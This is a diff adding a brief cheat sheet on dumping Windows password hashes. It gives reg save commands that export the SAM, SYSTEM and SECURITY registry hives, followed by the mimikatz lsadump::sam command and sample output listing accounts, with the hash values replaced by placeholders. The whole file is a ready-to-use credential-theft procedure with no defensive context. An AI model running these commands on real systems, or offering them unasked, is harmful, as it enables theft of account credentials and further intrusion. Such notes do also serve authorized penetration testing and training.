@@ -1,0 +1,32 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  DUMPING WINDOWS HASHES, MIMIKATZ USAGE IN WINDOWS
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2022-03-03[Mar-Thu]15-49PM 
+
+DUMP REG HASHES TO FILE
+
+reg save hklm\sam sam.dump
+reg save hklm\system system.dump
+reg save hklm\security security.dump
+
+USE MIMIKATZ TO EXTRACT HASHES
+
+mimikatz # lsadump::sam /sam:sam.dump /system:system.dump
+
+Domain : TS2
+SysKey : KEY
+Local SID : SID
+
+SAMKey : SAMKEY
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: HASH
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
